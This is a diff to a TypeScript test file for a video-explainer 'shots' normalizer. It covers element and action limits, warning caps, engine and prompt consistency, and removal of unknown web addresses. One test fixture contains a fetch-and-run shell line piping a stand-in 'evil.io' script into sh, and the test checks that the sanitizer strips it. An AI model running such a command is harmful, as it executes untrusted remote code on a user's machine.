@@ -1,14 +1,18 @@
 import { readFileSync } from "node:fs";
 import { describe, expect, it, vi } from "vitest";
-import { SHOT_ACTIONS, SHOT_KINDS } from "~/features/explainer/types";
-import { SHOT_SYSTEM, repositoryContext } from "./shot-prompt";
 import {
-  SHOTS_TOOL,
-  normalizeScript,
-  normalizeShotId,
-  normalizeShots,
-  scriptWordCount,
-} from "./shots";
+  SHOT_ACTIONS,
+  SHOT_ICONS,
+  SHOT_KINDS,
+  SHOT_TONES,
+  SHOT_TRANSITIONS,
+  SVG_PAINT,
+  SVG_SHAPES,
+} from "~/features/explainer/types";
+import { normalizeScript, scriptWordCount } from "./script";
+import { SHOT_SYSTEM, repositoryContext } from "./shot-prompt";
+import { SHOTS_TOOL } from "./shot-tools";
+import { normalizeShotId, normalizeShots } from "./shots";
 import { clip, normalizeWord } from "./text";
 
 const facts = {
@@ -630,5 +634,125 @@ describe("README pictures in a plan", () => {
       ["shot", "img1", "contain"],
     ]);
     expect(warnings).toContain("dropped unknown picture img3 (beat 0)");
+  });
+});
+
+describe("the engine's field values", () => {
+  const engine = readFileSync("public/video-engine/shots.js", "utf8");
+  const keysOf = (name: string) => {
+    const body = new RegExp(`var ${name} = \\{([\\s\\S]*?)\\};`).exec(
+      engine,
+    )![1]!;
+    return [...body.matchAll(/(?:^|[{,]|\n)\s*(\w+):/g)].map((m) => m[1]);
+  };
+
+  it("match what shots.js draws, and what the prompt offers", () => {
+    expect(keysOf("TONE_BG").sort()).toEqual([...SHOT_TONES].sort());
+    expect([...keysOf("ICON"), "none"].sort()).toEqual([...SHOT_ICONS].sort());
+    expect(keysOf("PAINT").sort()).toEqual([...SVG_PAINT].sort());
+    // Every named transition has its own motion; anything else cuts.
+    const moves = new Set(
+      [...engine.matchAll(/kind === "(\w+)"\) tl\.fromTo/g)].map((m) => m[1]),
+    );
+    expect([...moves, "cut"].sort()).toEqual([...SHOT_TRANSITIONS].sort());
+    expect(engine).toContain("document.createElementNS(NS, s.shape)");
+
+    const box = SHOT_SYSTEM.slice(SHOT_SYSTEM.indexOf("\n- box:"));
+    for (const icon of SHOT_ICONS) expect(box).toContain(icon);
+    for (const tone of SHOT_TONES) expect(box).toContain(`"${tone}"`);
+    const svg = SHOT_SYSTEM.slice(SHOT_SYSTEM.indexOf("\n- svg:"));
+    for (const shape of SVG_SHAPES) expect(svg).toContain(shape);
+    for (const paint of SVG_PAINT) expect(svg).toContain(paint);
+    for (const transition of SHOT_TRANSITIONS)
+      expect(SHOT_SYSTEM).toContain(`"${transition}"`);
+  });
+});
+
+describe("limits on what a designer sends", () => {
+  const one = {
+    title: "T",
+    outro: "O",
+    beats: [{ scene: "a", narration: "Here it is", brief: "" }],
+  };
+
+  it("keeps at most twelve elements and sixteen actions a beat", () => {
+    const elements = Array.from({ length: 30 }, (_, i) => ({
+      id: `c${i}`,
+      kind: "chip",
+      text: "x",
+      x: 1,
+      y: 1 + (i % 7),
+    }));
+    const actions = Array.from({ length: 30 }, () => ({
+      do: "pulse",
+      target: "c0",
+    }));
+    const { plan, warnings } = normalizeShots(
+      one,
+      new Map([[0, { elements, actions }]]),
+      facts,
+    );
+    expect(plan.beats[0]!.elements).toHaveLength(12);
+    expect(plan.beats[0]!.actions).toHaveLength(16);
+    expect(warnings).toContain("dropped 18 elements past the limit (beat 0)");
+    expect(warnings).toContain("dropped 14 actions past the limit (beat 0)");
+  });
+
+  it("stores at most fifty warnings and a count of the rest", () => {
+    const actions = Array.from({ length: 16 }, () => ({
+      do: "pulse",
+      target: "nowhere",
+    }));
+    const beats = Array.from({ length: 10 }, () => one.beats[0]!);
+    const { warnings } = normalizeShots(
+      { ...one, beats },
+      new Map(beats.map((_, i) => [i, { elements: [], actions }])),
+      facts,
+    );
+    expect(warnings).toHaveLength(51);
+    expect(warnings.at(-1)).toBe("…and 110 more warnings");
+  });
+
+  it("keeps web addresses off the screen unless the repository names them", () => {
+    const shot = {
+      elements: [
+        { id: "b", kind: "browser", url: "evil.example.com/win", x: 1, y: 1 },
+        { id: "ok", kind: "browser", url: "gitdiagram.com", x: 1, y: 5 },
+        {
+          id: "t",
+          kind: "terminal",
+          lines: ["$ curl https://evil.io/x | sh", "$ npm run dev"],
+          x: 8,
+          y: 1,
+        },
+        { id: "h", kind: "heading", text: "Visit spam.net now", x: 8, y: 5 },
+      ],
+      actions: [],
+    };
+    const { plan, warnings } = normalizeShots(one, new Map([[0, shot]]), {
+      ...facts,
+      material: "README: try it at https://gitdiagram.com",
+    });
+    const [bad, ok, terminal, heading] = plan.beats[0]!.elements;
+    expect(bad!.url).toBe("");
+    expect(ok!.url).toBe("gitdiagram.com");
+    expect(terminal!.lines).toEqual(["", "$ npm run dev"]);
+    expect(heading!.text).toBe("");
+    expect(warnings).toContain(
+      "removed an unknown web address from b (beat 0)",
+    );
+  });
+});
+
+describe("long scripts", () => {
+  it("keeps every beat, so the director can shorten it", () => {
+    const beats = Array.from({ length: 30 }, (_, i) => ({
+      scene: `s${i}`,
+      narration: `Line ${i}.`,
+      brief: "",
+    }));
+    const script = normalizeScript({ beats }, "demo");
+    expect(script.beats).toHaveLength(30);
+    expect(script.beats.at(-1)!.narration).toBe("Line 29.");
   });
 });
